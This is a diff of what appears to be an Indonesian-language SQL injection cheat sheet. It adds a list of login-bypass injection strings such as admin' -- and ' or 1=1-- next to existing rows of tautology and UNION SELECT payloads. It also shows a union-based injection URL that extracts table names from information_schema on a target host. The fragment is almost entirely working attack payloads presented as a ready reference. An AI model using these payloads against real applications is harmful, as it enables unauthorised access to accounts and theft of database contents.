@@ -35,6 +35,14 @@
 |---|---|
 |Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`|
 |UNION|`UNION SELECT`<br>`'UNION ALL SELECT`|
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
 
 ```
 http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
